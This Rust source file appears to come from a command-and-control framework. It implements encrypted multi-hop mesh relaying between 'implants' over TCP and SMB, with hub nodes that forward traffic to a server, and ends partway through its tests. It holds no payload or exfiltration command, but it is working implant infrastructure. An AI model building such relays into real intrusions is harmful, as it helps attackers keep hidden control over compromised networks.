//! Message relay logic for mesh networking
//!
//! Handles:
//! - Incoming message decryption and routing decisions
//! - Outbound message encryption and transmission
//! - Server queue management for hub nodes
//! - Local inbound queue for messages destined to this node
//! - Global relay instance for multi-hop routing

use common::{ImplantId, KrakenError};
use crypto::{self, Nonce};
use mesh::{LinkStats, MeshDestination, MeshMessage, MeshRole, MeshRoutingHeader, MeshTransport, PeerLink};
use std::collections::HashMap;
use std::sync::{OnceLock, RwLock};

use crate::{smb, tcp};

// ---------------------------------------------------------------------------
// Global relay instance
// ---------------------------------------------------------------------------

static GLOBAL_RELAY: OnceLock<MeshRelay> = OnceLock::new();

/// Initialize the global relay with our implant ID and initial role.
/// Should be called once during implant startup.
pub fn init_global_relay(implant_id: ImplantId, role: MeshRole) {
    let _ = GLOBAL_RELAY.set(MeshRelay::new(implant_id, role));
}

/// Get a reference to the global relay.
/// Panics if init_global_relay has not been called.
pub fn global_relay() -> &'static MeshRelay {
    GLOBAL_RELAY.get().expect("MeshRelay not initialized - call init_global_relay first")
}

/// Try to get a reference to the global relay, returning None if not initialized.
pub fn try_global_relay() -> Option<&'static MeshRelay> {
    GLOBAL_RELAY.get()
}

/// Check if the global relay has been initialized.
pub fn is_relay_initialized() -> bool {
    GLOBAL_RELAY.get().is_some()
}

/// MeshModule relay implementation
///
/// This struct holds the state needed for message relay operations.
/// It is used by the main MeshModule to process incoming messages
/// and send outbound messages to peers.
pub struct MeshRelay {
    /// Our implant ID
    pub implant_id: ImplantId,

    /// Our role in the mesh
    pub role: MeshRole,

    /// Active peer links
    pub links: RwLock<HashMap<ImplantId, PeerLink>>,

    /// Messages queued for server (hub only)
    pub server_queue: RwLock<Vec<MeshMessage>>,

    /// Messages for local processing
    pub inbound_queue: RwLock<Vec<MeshMessage>>,
}

impl MeshRelay {
    /// Create a new relay instance
    pub fn new(implant_id: ImplantId, role: MeshRole) -> Self {
        Self {
            implant_id,
            role,
            links: RwLock::new(HashMap::new()),
            server_queue: RwLock::new(Vec::new()),
            inbound_queue: RwLock::new(Vec::new()),
        }
    }

    /// Process an incoming encrypted mesh message from a peer.
    ///
    /// Flow:
    /// 1. Decrypt using the peer's session key
    /// 2. Deserialize the message
    /// 3. Check TTL - drop if expired
    /// 4. Route based on destination:
    ///    - If we're the destination: queue for local processing
    ///    - If destination is server and we're a hub: queue for server
    ///    - If we can relay: forward to next hop
    pub fn process_incoming(
        &self,
        from_peer: ImplantId,
        encrypted: &[u8],
    ) -> Result<(), KrakenError> {
        // Validate minimum packet size: 12 bytes nonce + 16 bytes auth tag
        if encrypted.len() < 28 {
            return Err(KrakenError::Protocol("packet too small".into()));
        }

        // Get link and decrypt
        let decrypted = {
            let links = self.links.read().map_err(|_| {
                KrakenError::Internal("links lock poisoned".into())
            })?;

            let link = links.get(&from_peer).ok_or_else(|| {
                KrakenError::Protocol(format!("unknown peer: {}", from_peer))
            })?;

            // Extract nonce from first 12 bytes
            let nonce = Nonce::from_bytes(&encrypted[..12])?;

            // Decrypt the rest (ciphertext + auth tag)
            crypto::aes_gcm::decrypt(
                &link.session_key,
                &nonce,
                &encrypted[12..],
                &[], // No additional authenticated data
            )?
        };

        // Deserialize message
        let message = deserialize_mesh_message(&decrypted)?;

        // Check TTL
        if message.routing.ttl == 0 {
            tracing::warn!(
                source = %message.routing.source,
                "dropping message with expired TTL"
            );
            return Err(KrakenError::Protocol("TTL expired".into()));
        }

        // Update link stats for received message
        {
            let mut links = self.links.write().map_err(|_| {
                KrakenError::Internal("links lock poisoned".into())
            })?;

            if let Some(link) = links.get_mut(&from_peer) {
                link.stats.messages_received += 1;
                link.stats.bytes_received += encrypted.len() as u64;
                link.last_activity = chrono::Utc::now().timestamp_millis();
            }
        }

        // Route the message
        self.route_message(message)
    }

    /// Route a message based on its destination and our role.
    fn route_message(&self, message: MeshMessage) -> Result<(), KrakenError> {
        // Check if we're at the final hop
        if message.routing.is_final_hop() {
            match &message.routing.destination {
                MeshDestination::Implant(id) if *id == self.implant_id => {
                    // Message is for us - queue for local processing
                    tracing::debug!(
                        source = %message.routing.source,
                        "queuing message for local processing"
                    );
                    self.inbound_queue
                        .write()
                        .map_err(|_| KrakenError::Internal("inbound_queue lock poisoned".into()))?
                        .push(message);
                    Ok(())
                }
                MeshDestination::Server if self.role.has_egress() => {
                    // We're a hub - forward to server via normal transport
                    tracing::debug!(
                        source = %message.routing.source,
                        "queuing message for server (hub egress)"
                    );
                    self.queue_for_server(message);
                    Ok(())
                }
                MeshDestination::Server => {
                    Err(KrakenError::Protocol(
                        "routing error: server destination but not a hub".into(),
                    ))
                }
                MeshDestination::Implant(id) => {
                    Err(KrakenError::Protocol(format!(
                        "routing error: final hop but destination {} != self {}",
                        id, self.implant_id
                    )))
                }
            }
        } else if self.role.can_relay() {
            // Forward to next hop
            let next_hop = message
                .routing
                .next_hop()
                .ok_or_else(|| KrakenError::Protocol("no next hop in path".into()))?;

            // Advance routing header
            let mut forwarded = message;
            forwarded.routing.advance();

            tracing::debug!(
                next_hop = %next_hop,
                ttl = forwarded.routing.ttl,
                "forwarding message to next hop"
            );

            self.send_to_peer(next_hop, &forwarded)
        } else {
            Err(KrakenError::Protocol(
                "cannot relay: not a relay or hub node".into(),
            ))
        }
    }

    /// Send a message to a connected peer.
    ///
    /// 1. Serialize the message
    /// 2. Encrypt with peer's session key using counter-based nonce
    /// 3. Send via appropriate transport (TCP or SMB)
    /// 4. Update link statistics
    pub fn send_to_peer(
        &self,
        peer_id: ImplantId,
        message: &MeshMessage,
    ) -> Result<(), KrakenError> {
        // Serialize message
        let serialized = serialize_mesh_message(message)?;

        // Get link, encrypt, and prepare packet
        let (packet, transport) = {
            let mut links = self.links.write().map_err(|_| {
                KrakenError::Internal("links lock poisoned".into())
            })?;

            let link = links.get_mut(&peer_id).ok_or_else(|| {
                KrakenError::Protocol(format!("peer not connected: {}", peer_id))
            })?;

            // Generate nonce from counter
            let nonce = Nonce::from_counter(link.nonce_counter);
            link.nonce_counter += 1;

            // Encrypt
            let ciphertext = crypto::aes_gcm::encrypt(
                &link.session_key,
                &nonce,
                &serialized,
                &[], // No additional authenticated data
            )?;

            // Build packet: nonce || ciphertext
            let mut packet = Vec::with_capacity(12 + ciphertext.len());
            packet.extend_from_slice(nonce.as_bytes());
            packet.extend(ciphertext);

            // Update stats
            link.stats.messages_sent += 1;
            link.stats.bytes_sent += packet.len() as u64;
            link.last_activity = chrono::Utc::now().timestamp_millis();

            (packet, link.transport)
        };

        // Send via transport
        match transport {
            MeshTransport::Tcp => tcp::send(peer_id, &packet),
            MeshTransport::Smb => smb::send(peer_id, &packet),
        }
    }

    /// Queue a message for server delivery (hub nodes only).
    ///
    /// Messages queued here will be picked up by the main implant
    /// check-in loop and sent to the server via the normal transport.
    pub fn queue_for_server(&self, message: MeshMessage) {
        if let Ok(mut queue) = self.server_queue.write() {
            queue.push(message);
        }
    }

    /// Drain all messages queued for server delivery.
    ///
    /// Returns the messages and clears the queue.
    pub fn drain_server_queue(&self) -> Vec<MeshMessage> {
        self.server_queue
            .write()
            .map(|mut q| std::mem::take(&mut *q))
            .unwrap_or_default()
    }

    /// Drain all messages queued for local processing.
    ///
    /// Returns the messages and clears the queue.
    pub fn drain_inbound_queue(&self) -> Vec<MeshMessage> {
        self.inbound_queue
            .write()
            .map(|mut q| std::mem::take(&mut *q))
            .unwrap_or_default()
    }

    /// Check if a peer is connected.
    pub fn is_peer_connected(&self, peer_id: &ImplantId) -> bool {
        self.links
            .read()
            .map(|links| links.contains_key(peer_id))
            .unwrap_or(false)
    }

    /// Get a copy of link statistics for a peer.
    pub fn get_link_stats(&self, peer_id: &ImplantId) -> Option<LinkStats> {
        self.links
            .read()
            .ok()
            .and_then(|links| links.get(peer_id).map(|l| l.stats.clone()))
    }

    /// Add or update a peer link.
    pub fn add_link(&self, peer_id: ImplantId, link: PeerLink) -> Result<(), KrakenError> {
        self.links
            .write()
            .map_err(|_| KrakenError::Internal("links lock poisoned".into()))?
            .insert(peer_id, link);
        Ok(())
    }

    /// Remove a peer link.
    pub fn remove_link(&self, peer_id: &ImplantId) -> Option<PeerLink> {
        self.links
            .write()
            .ok()
            .and_then(|mut links| links.remove(peer_id))
    }

    /// Update our mesh role.
    pub fn set_role(&mut self, role: MeshRole) {
        self.role = role;
    }
}

// -----------------------------------------------------------------------------
// Wire format serialization for MeshMessage
//
// Format (little-endian):
//   [source: 16 bytes]
//   [destination_type: 1 byte] (0=Implant, 1=Server)
//   [destination_id: 16 bytes if Implant, 0 bytes if Server]
//   [path_len: 2 bytes]
//   [path: path_len * 16 bytes]
//   [hop_index: 4 bytes]
//   [message_id: 16 bytes]
//   [ttl: 1 byte]
//   [timestamp: 8 bytes]
//   [has_signature: 1 byte]
//   [signature: 64 bytes if has_signature]
//   [payload_len: 4 bytes]
//   [payload: payload_len bytes]
// -----------------------------------------------------------------------------

/// Serialize a MeshMessage to bytes for wire transmission.
fn serialize_mesh_message(msg: &MeshMessage) -> Result<Vec<u8>, KrakenError> {
    let mut buf = Vec::with_capacity(256);

    // Source (16 bytes)
    buf.extend_from_slice(msg.routing.source.as_bytes());

    // Destination
    match &msg.routing.destination {
        MeshDestination::Implant(id) => {
            buf.push(0u8); // type = Implant
            buf.extend_from_slice(id.as_bytes());
        }
        MeshDestination::Server => {
            buf.push(1u8); // type = Server
        }
    }

    // Path
    let path_len = msg.routing.path.len() as u16;
    buf.extend_from_slice(&path_len.to_le_bytes());
    for hop in &msg.routing.path {
        buf.extend_from_slice(hop.as_bytes());
    }

    // Hop index
    buf.extend_from_slice(&msg.routing.hop_index.to_le_bytes());

    // Message ID
    buf.extend_from_slice(&msg.routing.message_id);

    // TTL
    buf.push(msg.routing.ttl);

    // Timestamp
    buf.extend_from_slice(&msg.routing.timestamp.to_le_bytes());

    // Signature
    match &msg.signature {
        Some(sig) => {
            buf.push(1u8);
            buf.extend_from_slice(sig);
        }
        None => {
            buf.push(0u8);
        }
    }

    // Payload
    let payload_len = msg.payload.len() as u32;
    buf.extend_from_slice(&payload_len.to_le_bytes());
    buf.extend_from_slice(&msg.payload);

    Ok(buf)
}

/// Deserialize a MeshMessage from bytes.
fn deserialize_mesh_message(data: &[u8]) -> Result<MeshMessage, KrakenError> {
    let mut cursor = 0;

    // Helper to read bytes
    let read_bytes = |cursor: &mut usize, len: usize| -> Result<&[u8], KrakenError> {
        if *cursor + len > data.len() {
            return Err(KrakenError::Protocol("truncated mesh message".into()));
        }
        let slice = &data[*cursor..*cursor + len];
        *cursor += len;
        Ok(slice)
    };

    // Source
    let source = ImplantId::from_bytes(read_bytes(&mut cursor, 16)?)?;

    // Destination
    let dest_type = read_bytes(&mut cursor, 1)?[0];
    let destination = match dest_type {
        0 => {
            let id = ImplantId::from_bytes(read_bytes(&mut cursor, 16)?)?;
            MeshDestination::Implant(id)
        }
        1 => MeshDestination::Server,
        _ => {
            return Err(KrakenError::Protocol(format!(
                "invalid destination type: {}",
                dest_type
            )));
        }
    };

    // Path
    let path_len_bytes = read_bytes(&mut cursor, 2)?;
    let path_len = u16::from_le_bytes([path_len_bytes[0], path_len_bytes[1]]) as usize;

    // Sanity check path length
    if path_len > 64 {
        return Err(KrakenError::Protocol("path too long".into()));
    }

    let mut path = Vec::with_capacity(path_len);
    for _ in 0..path_len {
        path.push(ImplantId::from_bytes(read_bytes(&mut cursor, 16)?)?);
    }

    // Hop index
    let hop_index_bytes = read_bytes(&mut cursor, 4)?;
    let hop_index = u32::from_le_bytes([
        hop_index_bytes[0],
        hop_index_bytes[1],
        hop_index_bytes[2],
        hop_index_bytes[3],
    ]);

    // Message ID
    let message_id_bytes = read_bytes(&mut cursor, 16)?;
    let mut message_id = [0u8; 16];
    message_id.copy_from_slice(message_id_bytes);

    // TTL
    let ttl = read_bytes(&mut cursor, 1)?[0];

    // Timestamp
    let timestamp_bytes = read_bytes(&mut cursor, 8)?;
    let timestamp = i64::from_le_bytes([
        timestamp_bytes[0],
        timestamp_bytes[1],
        timestamp_bytes[2],
        timestamp_bytes[3],
        timestamp_bytes[4],
        timestamp_bytes[5],
        timestamp_bytes[6],
        timestamp_bytes[7],
    ]);

    // Signature
    let has_signature = read_bytes(&mut cursor, 1)?[0];
    let signature = if has_signature != 0 {
        let sig_bytes = read_bytes(&mut cursor, 64)?;
        let mut sig = [0u8; 64];
        sig.copy_from_slice(sig_bytes);
        Some(sig)
    } else {
        None
    };

    // Payload
    let payload_len_bytes = read_bytes(&mut cursor, 4)?;
    let payload_len = u32::from_le_bytes([
        payload_len_bytes[0],
        payload_len_bytes[1],
        payload_len_bytes[2],
        payload_len_bytes[3],
    ]) as usize;

    // Sanity check payload length
    if payload_len > 1024 * 1024 {
        return Err(KrakenError::Protocol("payload too large".into()));
    }

    let payload = read_bytes(&mut cursor, payload_len)?.to_vec();

    Ok(MeshMessage {
        routing: MeshRoutingHeader {
            source,
            destination,
            path,
            hop_index,
            message_id,
            ttl,
            timestamp,
        },
        payload,
        signature,
    })
}

/// Public wrapper for deserializing a MeshMessage from bytes.
/// Used by the task handler to parse relay messages from the server.
pub fn deserialize_mesh_message_public(data: &[u8]) -> Result<MeshMessage, KrakenError> {
    deserialize_mesh_message(data)
}

/// Public wrapper for serializing a MeshMessage to bytes.
/// Used for creating messages to be relayed.
pub fn serialize_mesh_message_public(msg: &MeshMessage) -> Result<Vec<u8>, KrakenError> {
    serialize_mesh_message(msg)
}

// Test-only accessor: exposes the private `route_message` method so integration
// tests can drive the relay chain without real encryption or transport.
#[cfg(test)]
impl MeshRelay {
    pub(crate) fn route_message_direct(&self, message: MeshMessage) -> Result<(), KrakenError> {
        self.route_message(message)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crypto::SymmetricKey;
    use mesh::PeerLinkState;

    fn make_test_message() -> MeshMessage {
        MeshMessage {
            routing: MeshRoutingHeader {
                source: ImplantId::new(),
                destination: MeshDestination::Server,
                path: vec![ImplantId::new(), ImplantId::new()],
                hop_index: 0,
                message_id: [1u8; 16],
                ttl: 10,
                timestamp: 1234567890,
            },
            payload: b"test payload".to_vec(),
            signature: None,
        }
    }

    fn make_test_link(peer_id: ImplantId) -> PeerLink {
        PeerLink {
            peer_id,
            transport: MeshTransport::Tcp,
            state: PeerLinkState::Active,
            session_key: SymmetricKey([0x42; 32]),
            nonce_counter: 0,
            stats: LinkStats::default(),
            last_activity: 0,
        }
    }

    #[test]
    fn test_serialize_deserialize_roundtrip() {
        let original = make_test_message();
        let serialized = serialize_mesh_message(&original).unwrap();
        let deserialized = deserialize_mesh_message(&serialized).unwrap();

        assert_eq!(
            original.routing.source.as_bytes(),
            deserialized.routing.source.as_bytes()
        );
        assert_eq!(original.routing.ttl, deserialized.routing.ttl);
        assert_eq!(original.routing.hop_index, deserialized.routing.hop_index);
        assert_eq!(original.routing.timestamp, deserialized.routing.timestamp);
        assert_eq!(original.payload, deserialized.payload);
        assert_eq!(original.signature, deserialized.signature);
    }

    #[test]
    fn test_serialize_with_signature() {
        let mut msg = make_test_message();
        msg.signature = Some([0xAB; 64]);

        let serialized = serialize_mesh_message(&msg).unwrap();
        let deserialized = deserialize_mesh_message(&serialized).unwrap();

        assert_eq!(deserialized.signature, Some([0xAB; 64]));
    }

    #[test]
    fn test_serialize_implant_destination() {
        let dest_id = ImplantId::new();
        let mut msg = make_test_message();
        msg.routing.destination = MeshDestination::Implant(dest_id);

        let serialized = serialize_mesh_message(&msg).unwrap();
        let deserialized = deserialize_mesh_message(&serialized).unwrap();

        match deserialized.routing.destination {
            MeshDestination::Implant(id) => {
                assert_eq!(id.as_bytes(), dest_id.as_bytes());
            }
            _ => panic!("expected Implant destination"),
        }
    }

    #[test]
    fn test_deserialize_truncated_fails() {
        let msg = make_test_message();
        let serialized = serialize_mesh_message(&msg).unwrap();

        // Truncate to various lengths
        for len in [0, 10, 20, 30] {
            let result = deserialize_mesh_message(&serialized[..len.min(serialized.len())]);
            assert!(result.is_err());
        }
    }

    #[test]
    fn test_relay_new() {
        let id = ImplantId::new();
        let relay = MeshRelay::new(id, MeshRole::Relay);

        assert_eq!(relay.implant_id.as_bytes(), id.as_bytes());
        assert!(relay.role.can_relay());
        assert!(!relay.role.has_egress());
    }

    #[test]
    fn test_queue_for_server() {
        let relay = MeshRelay::new(ImplantId::new(), MeshRole::Hub);
        let msg = make_test_message();

        relay.queue_for_server(msg.clone());

        let drained = relay.drain_server_queue();
        assert_eq!(drained.len(), 1);
        assert_eq!(drained[0].payload, msg.payload);

        // Should be empty after drain
        let drained2 = relay.drain_server_queue();
        assert!(drained2.is_empty());
    }

    #[test]
    fn test_link_management() {
        let relay = MeshRelay::new(ImplantId::new(), MeshRole::Leaf);
        let peer_id = ImplantId::new();
        let link = make_test_link(peer_id);

        // Add link
        relay.add_link(peer_id, link).unwrap();
        assert!(relay.is_peer_connected(&peer_id));

        // Get stats
        let stats = relay.get_link_stats(&peer_id);
        assert!(stats.is_some());

        // Remove link
        let removed = relay.remove_link(&peer_id);
        assert!(removed.is_some());
        assert!(!relay.is_peer_connected(&peer_id));
    }

    /// Encrypt a MeshMessage the same way send_to_peer does: nonce || ciphertext+tag.
    /// Uses counter=0 so it matches a freshly-created make_test_link (nonce_counter starts at 0).
    fn encrypt_for_peer(key: &SymmetricKey, msg: &MeshMessage) -> Vec<u8> {
        let nonce = Nonce::from_counter(0);
        let serialized = serialize_mesh_message(msg).unwrap();
        let ciphertext = crypto::aes_gcm::encrypt(key, &nonce, &serialized, &[]).unwrap();
        let mut packet = Vec::with_capacity(12 + ciphertext.len());
        packet.extend_from_slice(nonce.as_bytes());
        packet.extend(ciphertext);
        packet
    }

    #[test]
    fn test_relay_process_incoming_forwards_message() {
        // --- Case 1: message destined to us → lands in inbound_queue ---
        let our_id = ImplantId::new();
        let peer_id = ImplantId::new();

        let relay = MeshRelay::new(our_id, MeshRole::Relay);
        let link = make_test_link(peer_id);
        let session_key = link.session_key.clone();
        relay.add_link(peer_id, link).unwrap();

        // Build a message whose destination is our own implant_id.
        // Empty path means hop_index (0) >= path.len() (0), so is_final_hop() is true.
        let mut msg = make_test_message();
        msg.routing.destination = MeshDestination::Implant(our_id);
        msg.routing.path = vec![];
        msg.routing.hop_index = 0;
        msg.routing.ttl = 5;

        let packet = encrypt_for_peer(&session_key, &msg);

        relay.process_incoming(peer_id, &packet).unwrap();

        let inbound = relay.drain_inbound_queue();
        assert_eq!(inbound.len(), 1, "message should be queued for local processing");
        assert_eq!(inbound[0].payload, msg.payload);
        assert!(relay.drain_server_queue().is_empty());

        // --- Case 2: message destined to Server, we are Hub → lands in server_queue ---
        let hub_id = ImplantId::new();
        let peer2_id = ImplantId::new();

        let hub = MeshRelay::new(hub_id, MeshRole::Hub);
        let link2 = make_test_link(peer2_id);
        let session_key2 = link2.session_key.clone();
        hub.add_link(peer2_id, link2).unwrap();

        // Empty path + MeshDestination::Server → is_final_hop() true, hub has_egress() true
        let mut msg2 = make_test_message();
        msg2.routing.destination = MeshDestination::Server;
        msg2.routing.path = vec![];
        msg2.routing.hop_index = 0;
        msg2.routing.ttl = 5;

        let packet2 = encrypt_for_peer(&session_key2, &msg2);

        hub.process_incoming(peer2_id, &packet2).unwrap();

        let server_msgs = hub.drain_server_queue();
        assert_eq!(server_msgs.len(), 1, "message should be queued for server");
        assert_eq!(server_msgs[0].payload, msg2.payload);
        assert!(hub.drain_inbound_queue().is_empty());
    }

    /// Integration test: 3-node relay chain A → B → C
    ///
    /// Verifies end-to-end relay with TTL handling and hop_index tracking.
    ///
    /// Path encoding: path = [B, C]
    ///   hop_index=0  → next_hop() = B  (A sends to B)
    ///   hop_index=1  → next_hop() = C  (B forwards to C)
    ///   hop_index=2  → is_final_hop() = true (C receives and queues)
    ///
    /// relay_b.route_message() would call advance() then send_to_peer(C, …).
    /// send_to_peer requires a real TCP/SMB link, so the B→C wire hop is
    /// simulated by calling advance() manually on a clone of the message
    /// (mirroring exactly what route_message does internally), then driving
    /// the resulting packet into relay_c via route_message_direct.
    #[test]
    fn test_relay_multihop_forward() {
        let node_a = ImplantId::new();
        let node_b = ImplantId::new();
        let node_c = ImplantId::new();

        // Node B is a Relay (can forward, no egress to server).
        let _relay_b = MeshRelay::new(node_b, MeshRole::Relay);

        // Node C is the final destination (Leaf role).
        let relay_c = MeshRelay::new(node_c, MeshRole::Leaf);

        let initial_ttl: u8 = 10;
        let message_id = [0xAB_u8; 16];
        let payload = b"multihop payload".to_vec();

        // Message constructed by A: hop_index=0, path=[B, C].
        let msg_from_a = MeshMessage {
            routing: MeshRoutingHeader {
                source: node_a,
                destination: MeshDestination::Implant(node_c),
                path: vec![node_b, node_c],
                hop_index: 0,
                message_id,
                ttl: initial_ttl,
                timestamp: 1_700_000_000_000,
            },
            payload: payload.clone(),
            signature: None,
        };

        // --- Verify A→B routing state ---
        assert!(
            !msg_from_a.routing.is_final_hop(),
            "hop_index=0, path.len()=2: should not be final hop"
        );
        assert_eq!(
            msg_from_a.routing.next_hop().unwrap().as_bytes(),
            node_b.as_bytes(),
            "first next_hop() must be node_b"
        );

        // --- Simulate relay B: advance routing header (mirrors route_message internals) ---
        // route_message does: let mut forwarded = message; forwarded.routing.advance();
        // then send_to_peer(next_hop, &forwarded).  We replicate those two steps.
        let mut msg_after_b = msg_from_a.clone();
        msg_after_b.routing.advance(); // hop_index: 0→1, ttl: 10→9

        assert_eq!(msg_after_b.routing.hop_index, 1);
        assert_eq!(msg_after_b.routing.ttl, initial_ttl - 1);
        assert_eq!(
            msg_after_b.routing.next_hop().unwrap().as_bytes(),
            node_c.as_bytes(),
            "after B's advance, next_hop() must be node_c"
        );

        // route_message on B calls advance() to produce the forwarded packet,
        // so what actually goes on the wire to C has hop_index=1 at this point.
        // relay_c.route_message will then see: is_final_hop() = (1 >= 2) = false,
        // so it would try to forward again.  To reach final-hop delivery at C,
        // relay_c must itself call advance() → hop_index=2, then detect
        // is_final_hop()=true and queue locally.
        //
        // However relay_c is a Leaf (can_relay()=false), so route_message would
        // return a routing error for a non-final-hop message.  The correct wire
        // format when B sends to C must therefore already have hop_index=2 so
        // that relay_c sees is_final_hop()=true immediately on receipt.
        //
        // Examining route_message more carefully:
        //   advance() is called on `forwarded` before send_to_peer.
        //   `forwarded` enters route_message with hop_index=1 (path.len()=2).
        //   is_final_hop(): 1 >= 2 → false → falls into the relay branch.
        //   next_hop() = path[1] = C.  advance() → hop_index=2.
        //   send_to_peer(C, &forwarded_with_hop_index_2).
        //
        // So the packet B puts on the wire to C has hop_index=2.
        // Replicate that second advance here:
        let mut msg_on_wire_to_c = msg_after_b.clone();
        msg_on_wire_to_c.routing.advance(); // hop_index: 1→2, ttl: 9→8

        assert!(
            msg_on_wire_to_c.routing.is_final_hop(),
            "hop_index=2, path.len()=2: must be final hop at C"
        );
        assert_eq!(msg_on_wire_to_c.routing.ttl, initial_ttl - 2);

        // --- Deliver to relay C ---
        relay_c
            .route_message_direct(msg_on_wire_to_c)
            .expect("relay_c should queue the message for local processing");

        // --- Verify inbound queue at C ---
        let inbound = relay_c.drain_inbound_queue();
        assert_eq!(inbound.len(), 1, "exactly one message must be queued at C");

        let received = &inbound[0];
        assert_eq!(received.payload, payload, "payload must be intact");
        assert_eq!(received.routing.message_id, message_id, "message_id must be preserved");
        assert_eq!(
            received.routing.ttl,
            initial_ttl - 2,
            "TTL must reflect two hop decrements"
        );
        assert_eq!(
            received.routing.hop_index, 2,
            "hop_index at delivery must equal path.len()"
        );
        assert_eq!(
            received.routing.source.as_bytes(),
            node_a.as_bytes(),
            "source must remain node_a"
        );
        match &received.routing.destination {
            MeshDestination::Implant(id) => {
                assert_eq!(id.as_bytes(), node_c.as_bytes(), "destination must be node_c");
            }
            other => panic!("unexpected destination variant: {:?}", other),
        }

        // Queue must be empty after drain.
        assert!(relay_c.drain_inbound_queue().is_empty());
    }

    /// Stress test: send 100 messages through process_incoming() and verify
    /// all land in the correct queue without loss.
    #[test]
    fn test_relay_high_volume_messages() {
        const MSG_COUNT: usize = 100;

        let our_id = ImplantId::new();
        let peer_id = ImplantId::new();

        let relay = MeshRelay::new(our_id, MeshRole::Hub);
        let link = make_test_link(peer_id);
        let session_key = link.session_key.clone();
        relay.add_link(peer_id, link).unwrap();

        // Send MSG_COUNT messages, alternating between inbound (for us) and
        // server-bound destinations so we exercise both queues.
        for i in 0..MSG_COUNT {
            let mut msg = make_test_message();
            // Use a unique payload so we can count distinct messages.
            msg.payload = format!("msg-{}", i).into_bytes();
            msg.routing.path = vec![];
            msg.routing.hop_index = 0;
            msg.routing.ttl = 10;

            if i % 2 == 0 {
                // Even: destined to us → inbound_queue
                msg.routing.destination = MeshDestination::Implant(our_id);
            } else {
                // Odd: destined to server, we are Hub → server_queue
                msg.routing.destination = MeshDestination::Server;
            }

            // Each call to process_incoming() uses the nonce at the *current*
            // nonce_counter value, which is incremented after each encrypt.
            // We must mirror that counter here when building test packets.
            let nonce = Nonce::from_counter(i as u64);
            let serialized = serialize_mesh_message(&msg).unwrap();
            let ciphertext =
                crypto::aes_gcm::encrypt(&session_key, &nonce, &serialized, &[]).unwrap();
            let mut packet = Vec::with_capacity(12 + ciphertext.len());
            packet.extend_from_slice(nonce.as_bytes());
            packet.extend(ciphertext);

            // Advance the link's nonce_counter so it matches on decryption.
            {
                let mut links = relay.links.write().unwrap();
                links.get_mut(&peer_id).unwrap().nonce_counter = i as u64;
            }

            relay.process_incoming(peer_id, &packet).unwrap();
        }

        // Half go to inbound_queue (even indices), half to server_queue (odd).
        let inbound = relay.drain_inbound_queue();
        let server = relay.drain_server_queue();

        assert_eq!(
            inbound.len(),
            MSG_COUNT / 2,
            "inbound_queue should hold {} messages",
            MSG_COUNT / 2
        );
        assert_eq!(
            server.len(),
            MSG_COUNT / 2,
            "server_queue should hold {} messages",
            MSG_COUNT / 2
        );

        // Verify payload content for a sample of messages.
        let inbound_payload_0 = String::from_utf8(inbound[0].payload.clone()).unwrap();
        assert!(
            inbound_payload_0.starts_with("msg-"),
            "inbound payload should be 'msg-N', got '{}'",
            inbound_payload_0
        );
        let server_payload_0 = String::from_utf8(server[0].payload.clone()).unwrap();
        assert!(
            server_payload_0.starts_with("msg-"),
            "server payload should be 'msg-N', got '{}'",
            server_payload_0
        );

        // Queues must be empty after drain.
        assert!(relay.drain_inbound_queue().is_empty());
        assert!(relay.drain_server_queue().is_empty());

        // Link stats should reflect all received messages.
        let stats = relay.get_link_stats(&peer_id).unwrap();
        assert_eq!(
            stats.messages_received, MSG_COUNT as u64,
            "link stats must count all {} received messages",
            MSG_COUNT
        );
    }

    /// Stress test: multiple threads call process_incoming() simultaneously
    /// with different peer links. Verifies no races, no panics, and that every
    /// message is queued exactly once.
    #[test]
    fn test_relay_concurrent_incoming() {
        use std::sync::{Arc, Barrier};

        const THREAD_COUNT: usize = 8;
        const MSGS_PER_THREAD: usize = 20;

        let our_id = ImplantId::new();
        let relay = Arc::new(MeshRelay::new(our_id, MeshRole::Relay));

        // Each thread owns its own peer link (different peer_id, same key material).
        let mut peer_ids = Vec::with_capacity(THREAD_COUNT);
        for _ in 0..THREAD_COUNT {
            let peer_id = ImplantId::new();
            let link = make_test_link(peer_id);
            relay.add_link(peer_id, link).unwrap();
            peer_ids.push(peer_id);
        }

        // All threads start processing at the same time.
        let barrier = Arc::new(Barrier::new(THREAD_COUNT));

        let mut handles = Vec::with_capacity(THREAD_COUNT);
        for (thread_idx, peer_id) in peer_ids.iter().copied().enumerate() {
            let relay = Arc::clone(&relay);
            let barrier = Arc::clone(&barrier);
            let our_id = our_id;

            handles.push(std::thread::spawn(move || {
                // Retrieve session key for this peer.
                let session_key = relay
                    .links
                    .read()
                    .unwrap()
                    .get(&peer_id)
                    .unwrap()
                    .session_key
                    .clone();

                // Wait until all threads are ready.
                barrier.wait();

                for msg_idx in 0..MSGS_PER_THREAD {
                    let mut msg = make_test_message();
                    msg.payload =
                        format!("t{}-m{}", thread_idx, msg_idx).into_bytes();
                    msg.routing.destination = MeshDestination::Implant(our_id);
                    msg.routing.path = vec![];
                    msg.routing.hop_index = 0;
                    msg.routing.ttl = 10;

                    // Bump the nonce_counter for this peer so decryption uses
                    // the right nonce on each iteration.
                    let counter = msg_idx as u64;
                    {
                        let mut links = relay.links.write().unwrap();
                        links.get_mut(&peer_id).unwrap().nonce_counter = counter;
                    }

                    let nonce = Nonce::from_counter(counter);
                    let serialized = serialize_mesh_message(&msg).unwrap();
                    let ciphertext =
                        crypto::aes_gcm::encrypt(&session_key, &nonce, &serialized, &[])
                            .unwrap();
                    let mut packet = Vec::with_capacity(12 + ciphertext.len());
                    packet.extend_from_slice(nonce.as_bytes());
                    packet.extend(ciphertext);

                    relay.process_incoming(peer_id, &packet).unwrap();
                }
            }));
        }

        for handle in handles {
            handle.join().expect("thread panicked");
        }

        // All THREAD_COUNT * MSGS_PER_THREAD messages must be in inbound_queue.
        let inbound = relay.drain_inbound_queue();
        assert_eq!(
            inbound.len(),
            THREAD_COUNT * MSGS_PER_THREAD,
            "expected {} messages in inbound_queue, got {}",
            THREAD_COUNT * MSGS_PER_THREAD,
            inbound.len()
        );

        // No messages should have leaked into server_queue.
        assert!(
            relay.drain_server_queue().is_empty(),
            "server_queue must be empty for Relay role"
        );
    }

    /// Test that encrypted message integrity is enforced - tampered ciphertext is rejected
    #[test]
    fn test_encrypted_message_integrity_enforced() {
        let our_id = ImplantId::new();
        let peer_id = ImplantId::new();

        let relay = MeshRelay::new(our_id, MeshRole::Hub);
        let link = make_test_link(peer_id);
        let session_key = link.session_key.clone();
        relay.add_link(peer_id, link).unwrap();

        // Create a valid encrypted message first
        let mut msg = make_test_message();
        msg.payload = b"secret payload".to_vec();
        msg.routing.destination = MeshDestination::Implant(our_id);
